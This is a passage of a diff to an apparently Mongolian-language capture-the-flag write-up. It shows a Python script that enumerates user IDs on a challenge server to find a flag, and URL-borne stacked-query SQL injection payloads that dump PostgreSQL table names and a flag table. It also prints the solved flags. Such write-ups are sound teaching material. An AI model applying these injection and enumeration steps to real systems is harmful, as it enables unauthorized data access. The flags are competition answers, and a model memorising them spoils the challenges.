@@ -67,3 +67,43 @@ Source code-г нь харж үзэхэд тухайн зураг нь [Google C
 {"id":1,"firstName":"Mekhi","lastName":"D'Amore","email":"Zachary_Kuhn53@hotmail.com","phone":"1-377-678-4096 x81626","address":"458 Wintheiser Place","city":"East Vitoberg","state":"Oklahoma","zip":"57905","company":"Emmerich and Sons","avatar":"https://cloudflare-ipfs.com/ipfs/Qmd3W5DuhgHirLHGVixi6V76LhCkZUz6pnFt5AJBiyvHye/avatar/496.jpg"}
 ```
 Тэгвэл эхлээд 100 дээр шалгахад *User not found* гэсэн бичиг гарна. Үүн дээрээс харвал 0-ээс 99 хүртэл id-тай хэрэглэгчид байгаа гэсэн үг.
+
+Магадгүй 0-ээс 99 хүртэл flag байгаа үгүйг мэдэх код бичиж үзье.
+```python
+import  requests
+  
+for i in range(0, 100):
+	userID = str(i)
+	URL = "https://my-customers.u18.haruulzangi.mn/user/" + userID
+	page = requests.get(URL)
+	content = str(page.content.decode('utf8'))
+	if  content.find('HZU18{') != -1:
+		flag = content[content.find('HZU18{'):]
+		break
+	else:
+		flag = "Oldsongui"
+		
+print("Flag: ", flag)
+```
+![image](https://user-images.githubusercontent.com/28390518/171200042-570591cd-3a7c-4def-bf77-a66e594461f2.png)
+Амжилттай flag-аа олж чадлаа! 😊
+
+***HZU18{9b36fa+NICE_LIST_0e7635b84cefe035}***
+
+> ### Vaccine
+> Вакцин бол нэг ёсны injection юм даа.
+> Холбоос 1: [https://vaccine.u18.haruulzangi.mn/vaccine](https://vaccine.u18.haruulzangi.mn/vaccine)
+> Холбоос 2: [https://vaccine.u18.haruulzangi.mn/vaccine/1](https://vaccine.u18.haruulzangi.mn/vaccine/1)
+
+Эхний холбоосоор орж үзэхэд 5-н төрлийн вакцины json мэдээлэл байгаа харагдана:
+![image](https://user-images.githubusercontent.com/28390518/171201261-e497473d-edcb-4b1c-b68d-3764b5686dea.png)
+Дараагийн холбоосоор ороход 1 гэсэн id-тай вакцины мэдээлэл харагдана. Энэ холбоосноос хархад **PostgreSQL** ашигласан байгааг анзаарч болно. 
+![image](https://user-images.githubusercontent.com/28390518/171201299-700abfa6-8e87-4f3f-87df-4b72a90651ce.png)
+За тэгвэл энгийн *SQL Injection* хийж үзэцгэе. Бид хамгийн эхлээд ямар ямар *table* байгааг мэдэх хэрэгтэй. Үүнд `SELECT table_name FROM information_schema.tables`-г ашиглаж үзье. https://vaccine.u18.haruulzangi.mn/vaccine/1;SELECT%20table_name%20FROM%20information_schema.tables гээд үзэхэд бүх *table* мэдээлэл гарч ирэх болно.
+
+![image](https://user-images.githubusercontent.com/28390518/171203341-bfe4ceac-d622-47a2-8241-c1ffbe162707.png)
+Эндээс *flag* гэх *table* байх бөгөөд энэ дээр *injection* хийцгэе. `SELECT * FROM flag` ашиглан https://vaccine.u18.haruulzangi.mn/vaccine/1;SELECT%20*%20FROM%20flag гэж ороход бидний **flag** гарч ирнэ 🤟
+![image](https://user-images.githubusercontent.com/28390518/171203867-deca9d5a-fee9-4e7f-8ce8-df755bf22d8b.png)
+
+***HZU18{sQL-!nj3ct3on---nice}***
+
